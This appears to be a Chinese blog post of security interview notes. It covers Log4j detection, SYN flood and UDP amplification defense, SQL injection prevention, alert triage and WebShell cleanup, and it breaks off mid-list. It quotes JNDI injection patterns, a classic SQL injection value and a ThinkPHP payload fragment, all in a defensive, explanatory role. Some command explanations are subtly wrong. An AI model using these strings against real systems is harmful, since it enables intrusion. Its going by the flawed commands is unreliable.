<p>在 Python 2 中，<code>xrange()</code> 函数返回一个<strong>生成器对象（xrange object）</strong>。它并不会一次性生成所有数字，而是在你迭代它的时候，按需**惰性（lazily）**地生成每一个数字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python 2</span></span><br><span class="line">my_generator = xrange(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span> my_generator</span><br><span class="line"><span class="comment"># 输出: xrange(5)</span></span><br></pre></td></tr></table></figure>

<p><strong>优点：</strong></p>
<ul>
<li><strong>内存效率高</strong>：它只存储生成规则，而不是所有数字，因此非常节省内存，即使处理巨大的数字序列也毫无压力</li>
<li><strong>速度快</strong>：因为它不需要提前生成整个列表，所以速度非常快</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>不支持索引和切片，因为对象中并没有存储所有数字。你只能通过循环来访问其中的元素</li>
</ul>
<p><strong>Python 3 中的变化</strong></p>
<p>在 Python 3 中，<code>range()</code> 函数被重新设计，它的行为和 Python 2 中的 <code>xrange()</code> 一样，返回一个<strong>可迭代对象（range object）</strong>，而不是列表</p>
<p><code>xrange()</code> 函数在 Python 3 中被移除</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>Python 2 range()</th>
<th>Python 2 xrange()</th>
<th>Python 3 range()</th>
</tr>
</thead>
<tbody><tr>
<td>返回类型</td>
<td>list (列表)</td>
<td>xrange object (生成器)</td>
<td>range object (可迭代对象)</td>
</tr>
<tr>
<td>内存使用</td>
<td>高（立即生成所有数字）</td>
<td>低（惰性生成）</td>
<td>低（惰性生成）</td>
</tr>
<tr>
<td>支持索引</td>
<td>是</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>性能</td>
<td>慢（处理大序列时）</td>
<td>快</td>
<td>快</td>
</tr>
<tr>
<td>是否推荐</td>
<td>不推荐</td>
<td>推荐</td>
<td>推荐</td>
</tr>
</tbody></table>
<hr>
<h3 id="怎么防重放攻击"><a href="#怎么防重放攻击" class="headerlink" title="怎么防重放攻击"></a>怎么防重放攻击</h3><p><strong>1. 使用一次性令牌 (Nonce) 或时间戳</strong></p>
<p>这是最常见也最有效的防范手段。核心思想是确保每个请求都是唯一的，即使被截获也无法再次使用</p>
<ul>
<li><strong>一次性令牌 (Nonce)</strong>: 这是一个随机生成的、只使用一次的字符串<ul>
<li><strong>工作原理</strong>: 服务器在发送给客户端的页面中嵌入一个隐藏的 Nonce。客户端在发送请求时，必须将这个 Nonce 包含在内。服务器端会验证这个 Nonce 是否被使用过。如果 Nonce 数据库中已存在，则拒绝该请求</li>
<li><strong>优点</strong>: 安全性高，能有效防止攻击者重复使用旧的请求</li>
<li><strong>缺点</strong>: 需要在服务器端维护一个 Nonce 数据库，增加了状态管理的复杂性</li>
</ul>
</li>
<li><strong>时间戳 (Timestamp)</strong>: 在请求中加入当前时间戳<ul>
<li><strong>工作原理</strong>: 客户端在发送请求时，将当前时间戳也作为参数发送。服务器接收到请求后，会检查时间戳是否在设定的有效时间窗口内（例如，30秒）。如果时间戳过期，则拒绝请求</li>
<li><strong>优点</strong>: 实现简单，不依赖于 Nonce 数据库</li>
<li><strong>缺点</strong>: 依赖于客户端和服务器时间的同步，如果两者时间差异较大，可能会导致正常请求被拒绝</li>
</ul>
</li>
</ul>
<p><strong>2. 添加序列号</strong></p>
<p>在通信协议中为每个请求添加一个递增的序列号</p>
<ul>
<li><strong>工作原理</strong>: 客户端在发送请求时，将一个单调递增的序列号也包含在内。服务器端会记录每个客户端会话的最新序列号。如果收到一个序列号比当前记录的小或等于的请求，则认为这是重放攻击，并拒绝该请求</li>
<li><strong>优点</strong>: 简单有效，特别适用于有序的协议</li>
<li><strong>缺点</strong>: 如果序列号在传输过程中丢失或被修改，可能会导致同步问题</li>
</ul>
<p><strong>3. 使用安全哈希和消息认证码</strong></p>
<p>这种方法可以验证消息的完整性和来源，从而发现消息是否被篡改或重放</p>
<ul>
<li><strong>工作原理</strong>: 客户端在发送请求时，使用共享密钥对整个请求数据（包括时间戳或 Nonce）计算一个<strong>消息认证码 (MAC)</strong>，并将 MAC 附加在请求后面。服务器端收到请求后，用同样的密钥和数据重新计算 MAC，如果两个 MAC 不匹配，则请求无效</li>
<li><strong>优点</strong>: 提供了数据完整性校验和来源认证，能够防御篡改和重放攻击</li>
<li><strong>缺点</strong>: 需要安全地管理和分发共享密钥。</li>
</ul>
<p><strong>4. 限制请求有效期</strong></p>
<p>即使没有上述复杂的机制，也可以通过限制请求的有效期来增加重放攻击的难度</p>
<ul>
<li><strong>工作原理</strong>: 服务器可以为每个请求设置一个短暂的生命周期。例如，当客户端请求登录凭证时，服务器可以返回一个有效期为 5 分钟的令牌。如果攻击者截获了这个令牌，它只能在 5 分钟内使用，过期后即失效</li>
<li><strong>优点</strong>: 简单且易于实现</li>
<li><strong>缺点</strong>: 不能完全防止在短时间内进行的重放攻击</li>
</ul>
<hr>
<h3 id="如何判断-Log4j-攻击成功"><a href="#如何判断-Log4j-攻击成功" class="headerlink" title="如何判断 Log4j 攻击成功"></a>如何判断 Log4j 攻击成功</h3><p><strong>1. 应用程序日志排查</strong></p>
<p>Log4j 漏洞的本质是利用 JNDI 注入，所以攻击者会在 HTTP 请求头（如 <strong>User-Agent</strong>、<strong>Referer</strong>、<strong>X-Api-Version</strong> 等）中注入恶意字符串</p>
<ul>
<li><strong>恶意字符串特征</strong>：<ul>
<li><code>$&#123;jndi:ldap://...&#125;</code></li>
<li><code>$&#123;jndi:rmi://...&#125;</code></li>
<li><code>$&#123;jndi:dns://...&#125;</code></li>
</ul>
</li>
<li><strong>排查方法</strong>：<ul>
<li>检查 Web 服务器（如 Nginx, Apache）的 <strong>access.log</strong> 或 <strong>error.log</strong>，以及应用程序自身的日志</li>
<li>使用 <strong>grep</strong> 命令搜索上述恶意字符串</li>
<li><strong>示例命令</strong>：<code>grep -r &quot;jndi:ldap&quot; /var/log/apache2/</code></li>
</ul>
</li>
</ul>
<p><strong>2. 外部网络连接排查</strong></p>
<p>当 Log4j 漏洞被成功利用后，受影响的应用程序会向攻击者指定的恶意 LDAP&#x2F;RMI 服务器发起连接，以加载和执行恶意代码</p>
<ul>
<li><strong>排查方法</strong>：<ul>
<li>检查系统的网络连接日志</li>
<li>使用 <strong>netstat</strong> 或 <strong>ss</strong> 命令查看是否有异常的、指向外部的 TCP 连接</li>
<li><strong>示例命令</strong>：<code>netstat -tulnp | grep LISTEN</code> 和 <code>netstat -tulnp | grep ESTABLISHED</code></li>
</ul>
</li>
<li><strong>需要警惕的连接</strong>：<ul>
<li>应用程序进程（如 Java）发起的、指向高端口（例如 8080、9001 等）的外部连接</li>
<li>那些不是正常业务所需、但由 Java 进程发起的异常连接</li>
</ul>
</li>
</ul>
<p><strong>3. 进程行为排查</strong></p>
<p>如果攻击者成功加载并执行了恶意代码，通常会产生新的进程。这些进程可能是反向 Shell、挖矿程序或其他的后门程序</p>
<ul>
<li><strong>排查方法</strong>：<ul>
<li>使用 <strong>ps -ef</strong> 或 <strong>top</strong> 命令检查正在运行的进程</li>
<li>关注与 Java 父进程不相关的、异常的子进程。例如，Java 进程下启动了一个名为 <code>bash</code> 或 <code>sh</code> 的子进程</li>
<li><strong>重点关注</strong>：<ul>
<li><strong>异常的进程名</strong>：如 <code>httpd-</code>、<code>kdevtmpfsi</code> 等，这些通常是挖矿程序的伪装名</li>
<li><strong>异常的 CPU 和内存占用</strong>：如果发现某个进程（尤其是非正常业务进程）占用了大量 CPU 资源，可能是挖矿程序</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>4. 系统文件和计划任务排查</strong></p>
<p>攻击者为了实现持久化控制，通常会在系统中留下后门</p>
<ul>
<li><p><strong>排查方法</strong>：</p>
<ul>
<li>检查 <strong>&#x2F;tmp</strong> 或 <strong>&#x2F;var&#x2F;tmp</strong> 目录下是否有异常的可执行文件或脚本</li>
<li>检查 <strong>cron</strong> 计划任务（如 <strong>&#x2F;etc&#x2F;cron.d&#x2F;</strong>）或 Windows 的任务计划程序，看是否有可疑的定时任务</li>
<li>检查用户的 <strong>~&#x2F;.ssh&#x2F;authorized_keys</strong> 文件，看是否被添加了未知的公钥</li>
</ul>
<hr>
<h3 id="讲讲-SYN-FLOOD-原理，防御，检测手段"><a href="#讲讲-SYN-FLOOD-原理，防御，检测手段" class="headerlink" title="讲讲 SYN FLOOD 原理，防御，检测手段"></a>讲讲 SYN FLOOD 原理，防御，检测手段</h3></li>
</ul>
<p><strong>SYN Flood 攻击原理</strong></p>
<p>SYN Flood 是一种利用 TCP 三次握手过程中的漏洞发起的攻击</p>
<p><strong>正常的三次握手流程：</strong></p>
<ol>
<li><strong>SYN</strong>：客户端向服务器发送一个 <code>SYN</code> 包，请求建立连接</li>
<li><strong>SYN-ACK</strong>：服务器收到 <code>SYN</code> 包后，分配资源，并回复一个 <code>SYN-ACK</code> 包</li>
<li><strong>ACK</strong>：客户端收到 <code>SYN-ACK</code> 后，回复一个 <code>ACK</code> 包，三次握手完成，连接建立</li>
</ol>
<p><strong>SYN Flood 攻击原理：</strong> 攻击者利用这个过程，向服务器发送大量的 <code>SYN</code> 包。但与正常连接不同的是，攻击者不会回复第三步的 <code>ACK</code> 包</p>
<ol>
<li><strong>大量 SYN 包</strong>：攻击者利用伪造的源 IP 地址（以隐藏自己的真实身份），向目标服务器发送海量的 <code>SYN</code> 包</li>
<li><strong>服务器资源耗尽</strong>：服务器收到每个 <code>SYN</code> 包后，都会为它在半开连接队列（Half-Open Connection Queue）中分配一个连接状态，并发送一个 <code>SYN-ACK</code> 包</li>
<li><strong>无响应</strong>：由于攻击者使用的是伪造的 IP 地址，服务器发送的 <code>SYN-ACK</code> 包永远不会被响应</li>
<li><strong>队列饱和</strong>：随着半开连接队列被大量伪造连接迅速填满，服务器无法再处理新的合法连接请求。最终，新的正常用户无法连接，导致服务不可用，即达到了拒绝服务攻击的目的</li>
</ol>
<p>这种攻击的危害在于，攻击者利用极小的代价，就可以耗尽服务器大量的内存和 CPU 资源</p>
<p><strong>SYN Flood 防御手段</strong></p>
<p>防御 SYN Flood 攻击主要从两个方向入手：<strong>增加服务器处理能力</strong>和<strong>优化连接处理机制</strong></p>
<p><strong>1. 调整 TCP&#x2F;IP 参数</strong></p>
<p>这是最简单直接的防御措施，可以通过修改 Linux 内核参数来增加半开连接队列的容量和缩短超时时间</p>
<ul>
<li><strong><code>net.ipv4.tcp_max_syn_backlog</code></strong>: 增加这个参数的值，可以增大半开连接队列的容量</li>
<li><strong><code>net.ipv4.tcp_synack_retries</code></strong>: 减少服务器发送 <code>SYN-ACK</code> 重试的次数，从而缩短半开连接的超时时间，更快地释放资源</li>
</ul>
<p><strong>2. SYN Cookie</strong></p>
<p>这是一种非常有效的防御机制，它改变了服务器处理 <code>SYN</code> 包的方式，使其在受到攻击时表现得更加健壮</p>
<p><strong>工作原理：</strong></p>
<ol>
<li><strong>不分配资源</strong>：服务器收到 <code>SYN</code> 包后，不会立即为它分配资源</li>
<li><strong>生成 Cookie</strong>：服务器将客户端的 IP、端口、MSS 等信息，加上一个服务器独有的密钥，通过哈希算法生成一个 <code>SYN Cookie</code></li>
<li><strong>发送 SYN-ACK</strong>：服务器把这个 <code>SYN Cookie</code> 作为 TCP 序列号，发送 <code>SYN-ACK</code> 包</li>
<li><strong>客户端回复</strong>：如果客户端是合法的，它会回复一个 <code>ACK</code> 包，该包中的序列号正是 <code>SYN Cookie</code> 加 1 的值</li>
<li><strong>验证 Cookie</strong>：服务器收到 <code>ACK</code> 包后，不检查半开连接队列，而是根据其中的序列号，反向计算并验证 <code>SYN Cookie</code>。如果验证成功，才分配资源并建立连接</li>
</ol>
<p>这种机制的优点是，在完成三次握手前，服务器不会为连接分配任何资源，从而大大降低了被 SYN Flood 攻击的风险。</p>
<p><strong>3. 硬件和软件防火墙</strong></p>
<p>现代防火墙和入侵检测系统（IDS）通常内置了 SYN Flood 检测和防御功能</p>
<ul>
<li><strong>速率限制</strong>：对来自同一 IP 或同一网段的 <code>SYN</code> 请求进行速率限制</li>
<li><strong>白名单&#x2F;黑名单</strong>：通过规则限制可疑 IP 的访问</li>
<li><strong>使用负载均衡器</strong>：将请求分发到多台服务器，可以分散攻击流量</li>
</ul>
<p><strong>SYN Flood 检测手段</strong></p>
<p>及时发现 SYN Flood 攻击是防御的第一步。</p>
<p><strong>1. 系统网络状态监控</strong></p>
<p>使用 <code>netstat</code> 或 <code>ss</code> 命令是监控 TCP 连接状态最常用的方法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看所有 TCP 连接</span></span><br><span class="line">netstat -nt | grep tcp</span><br><span class="line"><span class="comment"># 使用 ss 查看 SYN_RECV 状态的连接</span></span><br><span class="line">ss -s</span><br></pre></td></tr></table></figure>

<ul>
<li>在正常情况下，<code>SYN_RECV</code> 状态的连接数量应该很小。如果这个数字突然暴增，就可能正在遭受 SYN Flood 攻击</li>
</ul>
<p><strong>2. 网络流量分析</strong></p>
<p>使用网络抓包工具（如 <code>tcpdump</code>）可以对流量进行深入分析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只抓取 SYN 包</span></span><br><span class="line">tcpdump -n <span class="string">&#x27;tcp[tcpflags] &amp; tcp-syn != 0 and tcp[tcpflags] &amp; tcp-ack == 0&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>分析结果</strong>：如果抓到的流量中，大部分都是带有伪造源 IP 的 <code>SYN</code> 包，且没有后续的 <code>ACK</code> 包，那么基本可以断定是 SYN Flood 攻击</li>
</ul>
<p><strong>3. IDS&#x2F;IPS 日志</strong></p>
<p>如果系统中部署了入侵检测系统（IDS）或入侵防御系统（IPS），它们会记录可疑的网络流量。通过查看 Snort、Suricata 等工具的日志，可以快速发现大量来自同一源 IP 或不同源 IP 的 <code>SYN</code> 攻击事件</p>
<hr>
<h3 id="讲讲-UDP-反射放大的原理，防御，检测手段"><a href="#讲讲-UDP-反射放大的原理，防御，检测手段" class="headerlink" title="讲讲 UDP 反射放大的原理，防御，检测手段"></a>讲讲 UDP 反射放大的原理，防御，检测手段</h3><p><strong>UDP 反射放大攻击原理</strong></p>
<p>UDP 反射放大攻击利用的是 <strong>UDP 协议的无连接性</strong>和一些 <strong>特定协议的请求&#x2F;响应不对称性</strong>。攻击者不会直接攻击目标，而是通过中间服务器作为“放大器”，将小流量的请求放大成大流量的响应，然后将这些响应全部导向受害者</p>
<p><strong>工作流程：</strong></p>
<ol>
<li><strong>伪造请求</strong>：攻击者首先伪造一个请求包，将<strong>源 IP 地址</strong>设置为受害者的 IP 地址。这个请求包通常非常小</li>
<li><strong>发送给放大器</strong>：攻击者将这个伪造的请求包发送给互联网上大量的开放服务，这些服务被称为“放大器”，例如 DNS 服务器、NTP 服务器、SSDP 服务等</li>
<li><strong>触发放大</strong>：这些放大器收到请求后，由于 UDP 协议不需要验证源 IP，它们会认为这个请求是合法的，并生成一个相应的响应包</li>
<li><strong>反射与放大</strong>：这个响应包被发送到伪造的源 IP 地址，即受害者的服务器。关键是，某些协议的响应包要比请求包大得多。例如，一个 60 字节的 DNS 查询请求，可能得到一个 3000 字节的响应。这个比率就是<strong>放大倍数（Amplification Factor）</strong></li>
<li><strong>洪水攻击</strong>：攻击者利用少量的请求流量，就可以通过成百上千个放大器，将巨大的响应流量反射到受害者服务器，导致其网络带宽耗尽，服务不可用</li>
</ol>
<p><strong>UDP 反射放大攻击防御手段</strong></p>
<p>防御这类攻击需要从多个层面入手，包括源头控制、网络路由和目标保护。</p>
<p><strong>1. BCP38（入站过滤）</strong></p>
<p><strong>这是从源头遏制攻击的最佳方法。</strong> BCP38 是 RFC2827 提出的最佳实践，要求网络服务提供商（ISP）在其网络边缘，对所有出站的数据包进行源 IP 地址验证</p>
<ul>
<li><strong>工作原理</strong>：ISP 检查其客户发出的数据包。如果数据包的源 IP 地址不属于该客户分配的 IP 地址块，ISP 就应该丢弃这个数据包</li>
<li><strong>防御效果</strong>：这可以阻止攻击者伪造源 IP 地址，从而使反射放大攻击无法成功。</li>
</ul>
<p><strong>2. 服务端加固</strong></p>
<p>作为服务器管理员，可以对自己的服务进行配置，防止被用作放大器</p>
<ul>
<li><strong>关闭不必要的 UDP 服务</strong>：例如，如果不需要 DNS 解析或 NTP 服务，应关闭 UDP 端口 53 和 123</li>
<li><strong>限制请求速率</strong>：对高放大倍数的 UDP 服务（如 DNS、NTP）设置请求速率限制</li>
<li><strong>禁用不安全的协议功能</strong>：例如，禁用 DNS 服务的递归查询功能，或只允许内部 IP 进行递归查询</li>
</ul>
<p><strong>3. 网络流量清洗（Traffic Scrubbing）</strong></p>
<p>当攻击发生时，这是最有效的应对措施</p>
<ul>
<li><strong>工作原理</strong>：流量清洗服务提供商（如 Cloudflare, Akamai）拥有巨大的网络带宽。当检测到 DDoS 攻击时，会将受害者的流量引导到其清洗中心</li>
<li><strong>过滤机制</strong>：清洗中心通过协议分析和异常流量检测，识别并丢弃恶意流量，只将干净的正常流量转发给受害者</li>
<li><strong>防御效果</strong>：这能有效吸收和过滤掉大量的反射放大流量，保护目标服务器</li>
</ul>
<p><strong>4. 限制 UDP 速率</strong></p>
<p>在防火墙、路由器或服务器上，对 UDP 流量进行速率限制</p>
<ul>
<li><strong>工作原理</strong>：配置防火墙规则，限制特定 UDP 端口（如 53, 123）的入站流量速率</li>
<li><strong>优点</strong>：简单易行</li>
<li><strong>缺点</strong>：可能会误伤正常的 UDP 流量，导致服务不可用</li>
</ul>
<p><strong>UDP 反射放大攻击检测手段</strong></p>
<p>检测这类攻击通常依赖于流量监控和异常行为分析</p>
<p><strong>1. 流量监控与分析</strong></p>
<ul>
<li><strong>流量突然暴增</strong>：这是最直观的指标。监控网络流量图，如果 UDP 入站流量在短时间内激增，可能就是遭受了攻击</li>
<li><strong>端口异常</strong>：分析入站流量。如果来自不常用或特定的 UDP 端口（如 53、123、1900）的流量异常增多，可能就是攻击正在进行</li>
<li><strong>数据包大小</strong>：使用 <code>tcpdump</code> 或流量分析工具，观察入站 UDP 包的大小。如果大部分入站 UDP 包都异常大，而对应端口的出站请求包却很少，这正是反射放大攻击的典型特征</li>
</ul>
<p><strong>2. 系统日志与连接状态</strong></p>
<ul>
<li><strong>系统负载</strong>：检查服务器的 CPU 和网络接口的负载情况。大量的入站流量会消耗 CPU 资源进行数据包处理，并迅速填满网络带宽</li>
<li><strong>服务日志</strong>：查看 DNS、NTP 等服务的日志，如果发现异常多的请求，特别是来自大量的不同 IP 地址的请求，可能是攻击者在扫描和利用放大器</li>
</ul>
<hr>
<h3 id="给你一个告警的内网-IP，怎么快速定位到他在哪栋楼哪层"><a href="#给你一个告警的内网-IP，怎么快速定位到他在哪栋楼哪层" class="headerlink" title="给你一个告警的内网 IP，怎么快速定位到他在哪栋楼哪层"></a>给你一个告警的内网 IP，怎么快速定位到他在哪栋楼哪层</h3><p><strong>（优质的甲方是会给资产表的！！！）</strong></p>
<p><strong>1. 找到 IP 地址所在的子网掩码</strong></p>
<p>​	1.1 通过查看 IP 地址和子网掩码可以确定这个 IP 地址所在的子网范围，从而缩小搜索范围</p>
<p><strong>2. 确定 IP 地址的 MAC 地址</strong></p>
<p>​	2.1 可以通过 ARP 请求获取到 IP 地址对应的 MAC 地址，然后查找交换机或路由器的 ARP 缓存表，找到 MAC 地址对应的端口</p>
<p><strong>3. 确定交换机或路由器的位置</strong></p>
<p>​	3.1 根据找到的交换机或路由器的端口，可以通过查看设备的物理位置和 IP 地址，确定设备的位置</p>
<p><strong>4. 确定线缆连接位置</strong></p>
<p>​	4.1 如果找到的设备有多个端口，则需要检查哪个端口连接了目标 IP 地址所在的子网，进而找到线缆的连接位置</p>
<p><strong>5. 确定线缆的路径</strong></p>
<p>​	5.1 根据线缆的连接位置，可以确定线缆的路径，从而确定目标IP地址的物理位置</p>
<hr>
<h3 id="SQL-注入防御方法"><a href="#SQL-注入防御方法" class="headerlink" title="SQL 注入防御方法"></a>SQL 注入防御方法</h3><p><strong>1. 使用预编译语句</strong></p>
<p>这是最有效、也是最推荐的防御方法。预编译语句会先将 SQL 语句发送到数据库进行编译，然后将用户输入作为参数传递给编译好的语句。这样一来，用户输入的数据就无法改变 SQL 语句本身的结构</p>
<ul>
<li><strong>原理</strong>：将 SQL 语句与用户输入的数据分开处理。数据库会把用户输入的内容看作纯粹的<strong>数据</strong>，而不是可执行的<strong>代码</strong></li>
<li><strong>示例</strong>：<ul>
<li><strong>不安全的代码</strong>：<code>&quot;SELECT * FROM users WHERE username = &#39;&quot; + userInput + &quot;&#39;;&quot;</code><ul>
<li>如果 <code>userInput</code> 是 <code>&#39; OR 1=1 --</code>，整个语句就变成了 <code>SELECT * FROM users WHERE username = &#39;&#39; OR 1=1 --;</code>，从而绕过登录验证</li>
</ul>
</li>
<li><strong>安全的预编译语句</strong>：<code>&quot;SELECT * FROM users WHERE username = ?;&quot;</code><ul>
<li>这里的问号 <code>?</code> 是一个占位符。无论用户输入什么，都会被当作 <code>username</code> 字段的值来处理，而不是 SQL 代码</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>2. 对所有用户输入进行严格验证和过滤</strong></p>
<p>永远不要相信用户的任何输入。在将数据送入数据库之前，必须对其进行验证和过滤</p>
<ul>
<li><strong>白名单验证</strong>：只允许特定的字符、格式或值通过。例如，如果某个输入框只接受数字，那么就只允许数字通过</li>
<li><strong>黑名单过滤</strong>：禁止某些特定的危险字符或字符串，如单引号 <code>&#39;</code>、分号 <code>;</code>、双破折号 <code>--</code> 等。但是，这种方法很容易被绕过，不推荐作为主要的防御手段</li>
</ul>
<p><strong>3. 使用 ORM 框架</strong></p>
<p>许多现代编程语言的框架都提供了 ORM 工具，例如 Java 的 Hibernate、Python 的 SQLAlchemy、PHP 的 Eloquent。这些框架通常内置了对 SQL 注入的保护机制</p>
<ul>
<li><strong>优点</strong>：<ul>
<li><strong>安全性</strong>：ORM 框架会自动处理参数绑定，将开发者从手动编写安全 SQL 语句的繁琐工作中解放出来</li>
<li><strong>易用性</strong>：开发者可以使用面向对象的方式操作数据库，无需直接编写 SQL 语句</li>
</ul>
</li>
</ul>
<p><strong>4. 最小权限原则</strong></p>
<p>为数据库账户分配最小的权限。一个账户如果只需要读取数据，就只给它 <code>SELECT</code> 权限，不要给它 <code>INSERT</code>、<code>UPDATE</code> 或 <code>DELETE</code> 权限</p>
<ul>
<li><strong>好处</strong>：即使攻击者成功注入了 SQL 代码，也无法执行超出该账户权限范围的操作，如删除整个数据库</li>
</ul>
<p><strong>5. 错误信息处理</strong></p>
<p>不要向用户暴露详细的数据库错误信息。攻击者可以利用这些信息来了解数据库结构、版本等，从而更容易发起下一次攻击</p>
<ul>
<li><strong>正确做法</strong>：当数据库查询失败时，只向用户显示一个通用的、友好的错误页面，并在后台日志中记录详细信息，供开发者排查</li>
</ul>
<p><strong>6. 使用 Web 应用防火墙（WAF）</strong></p>
<p>WAF 可以在 Web 应用之前对 HTTP 请求进行过滤和拦截，它可以识别并阻止包含 SQL 注入特征的恶意请求</p>
<ul>
<li><p><strong>优点</strong>：</p>
<ul>
<li><strong>全面保护</strong>：可以为整个应用提供一层额外的保护</li>
<li><strong>实时拦截</strong>：在攻击到达应用之前就将其阻止</li>
</ul>
</li>
<li><p><strong>局限性</strong>：</p>
<ul>
<li>WAF 的规则可能需要不断更新，以应对新的攻击方式</li>
<li>可能会有误报，影响正常用户的访问</li>
</ul>
<hr>
<h3 id="数万条告警怎么快速找到攻击成功的告警"><a href="#数万条告警怎么快速找到攻击成功的告警" class="headerlink" title="数万条告警怎么快速找到攻击成功的告警"></a>数万条告警怎么快速找到攻击成功的告警</h3></li>
</ul>
<p>优先<strong>过滤掉无效告警和误报告警</strong>，从而大幅降低分析成本</p>
<ul>
<li><strong>无效告警的判断</strong>：无效告警通常是由于攻击者对非活跃或不存在的资产进行扫描而产生的。例如，攻击者对某个 C 段进行批量扫描，尽管安全设备产生了告警，但如果被扫描的 IP 根本没有运行任何服务，那么这个告警就是无效的</li>
<li><strong>误报告警的判断</strong>：误报告警通常是由于安全设备的特征规则被非攻击行为意外触发。我们可以通过以下方式来判断：<ul>
<li><strong>流量分析</strong>：分析流量数据包，看它是否符合正常的业务操作</li>
<li><strong>HTTP状态码与页面回显</strong>：检查告警中 URL 的 HTTP 状态码。如果状态码是 404（未找到），或者页面回显数据是通用错误信息，那么这很可能是一次<strong>未成功</strong>的攻击尝试，可以作为误报的判断条件</li>
</ul>
</li>
</ul>
<p>经过第一步的筛选后，剩下的告警就更有分析价值了。我们需要从这些“待分析告警”中提取<strong>攻击特征</strong>，并将其与<strong>情报线索</strong>进行关联</p>
<ul>
<li><p><strong>提取攻击特征</strong>：从告警日志中提取关键信息，例如攻击的 Payload</p>
<ul>
<li>例如，在告警数据中发现 <code>/index/index/index?options=id)%2bupdatexml(...)</code> 这段 Payload</li>
</ul>
</li>
<li><p><strong>情报关联</strong>：将提取的攻击特征与<strong>攻击特征规则库</strong>进行匹配</p>
<ul>
<li>通过匹配，我们发现上述 Payload 与 <strong>ThinkPHP5 框架的 SQL 注入漏洞</strong>相关联</li>
</ul>
</li>
<li><p><strong>资产指纹核查</strong>：在获取到情报线索后，并不是所有关联的告警都需要深入分析。我们需要结合<strong>资产指纹信息库</strong>进行核查</p>
<ul>
<li>继续上面的例子，如果被攻击的资产并没有使用 ThinkPHP5 框架，那么尽管 WAF 发出了告警，但这起攻击尝试是<strong>不可能成功</strong>的。这种情况下，我们可以将这条告警排除，从而进一步缩小分析范围</li>
</ul>
<hr>
</li>
</ul>
<h3 id="WebShell-查杀后仍有流量怎么办"><a href="#WebShell-查杀后仍有流量怎么办" class="headerlink" title="WebShell 查杀后仍有流量怎么办"></a>WebShell 查杀后仍有流量怎么办</h3><p><strong>第一步：确认并隔离威胁</strong></p>
<ul>
<li><strong>立即隔离</strong>：最重要的一步是立即将受感染的服务器从网络中隔离出来。拔掉网线，或者在防火墙上设置策略，切断所有入站和出站的网络连接。这能防止攻击者继续控制服务器，并阻止他们进行横向移动，感染其他内网资产</li>
<li><strong>确认流量来源</strong>：<ul>
<li><strong>查看进程</strong>：使用 <code>netstat -ano</code> （Windows）或 <code>netstat -anp</code> （Linux）命令，查找建立异常外连的进程</li>
<li><strong>关联PID</strong>：找到可疑进程的PID（进程ID），然后使用 <code>ps -ef | grep [PID]</code> （Linux）或任务管理器（Windows）来确定该进程的详细信息，包括其父进程、启动路径和命令行参数</li>
</ul>
</li>
</ul>
<p><strong>第二步：分析与清除持久化机制</strong></p>
<p>当 WebShell 被清除后，外连流量依然存在，这表明攻击者已经利用 WebShell <strong>留下了后门</strong></p>
<ul>
<li><strong>排查计划任务</strong>：攻击者最常用的持久化方式之一就是利用计划任务<ul>
<li><strong>Linux</strong>：检查 <code>/etc/crontab</code>、<code>/etc/cron.d/</code>、<code>/var/spool/cron/</code> 和用户的 <code>crontab -l</code>，查找是否有可疑的定时任务，例如定时执行脚本或下载恶意文件的任务</li>
<li><strong>Windows</strong>：使用 <code>schtasks</code> 命令或任务计划程序来检查是否存在异常的定时任务</li>
</ul>
</li>
<li><strong>排查自启动项</strong>：恶意程序可能会通过系统自启动项实现开机自启<ul>
<li><strong>Linux</strong>：检查 <code>/etc/rc.local</code>、<code>/etc/profile</code>、<code>~/.bashrc</code> 等文件</li>
<li><strong>Windows</strong>：检查注册表的 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> 和 <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
</ul>
</li>
<li><strong>排查系统服务</strong>：攻击者可能会创建新的系统服务<ul>
<li><strong>Windows</strong>：使用 <code>services.msc</code> 或 <code>sc query state=all</code> 命令检查是否有异常服务</li>
<li><strong>Linux</strong>：检查 <code>/etc/init.d/</code> 或 <code>/lib/systemd/system/</code> 目录</li>
</ul>
</li>
<li><strong>排查系统后门文件</strong>：恶意文件可能被伪装成系统文件，藏在 <code>/tmp</code>、<code>/var/tmp</code> 或 <code>/var/shm</code> 等临时目录，甚至是 <code>/bin</code> 或 <code>/usr/bin</code> 下</li>
</ul>
<p><strong>第三步：取证与溯源</strong></p>
<p>在清除所有威胁后，我们需要进行更深入的取证，以了解攻击者是如何入侵的</p>
<ul>
<li><strong>检查日志</strong>：<ul>
<li><strong>Web日志</strong>：分析Web服务器的 <code>access.log</code> 和 <code>error.log</code>，查找可疑的入侵路径</li>
<li><strong>系统日志</strong>：检查 <code>/var/log/secure</code> 或 <code>auth.log</code>，看是否有异常登录或权限提升记录</li>
<li><strong>其他日志</strong>：检查数据库、FTP 等服务的日志，寻找可疑的活动</li>
</ul>
</li>
<li><strong>文件时间戳</strong>：使用 <code>ls -alt</code> 命令，查看最近修改的文件，这有助于发现攻击者新创建的恶意文件</li>
<li><strong>威胁情报</strong>：将可疑的 IP 地址、域名、文件哈希值提交到威胁情报平台，看它们是否与已知的恶意活动相关</li>
</ul>
<p><strong>第四步：修复漏洞并加固</strong></p>
<ul>
<li><strong>漏洞修复</strong>：定位并修复被利用的漏洞。如果攻击者是通过 WebShell 入侵的，很可能是因为 Web 应用存在漏洞，例如文件上传、代码执行或反序列化漏洞</li>
<li><strong>权限收紧</strong>：<ul>
<li><strong>应用权限</strong>：将 Web 应用以低权限用户运行，限制其对文件系统的读写权限</li>
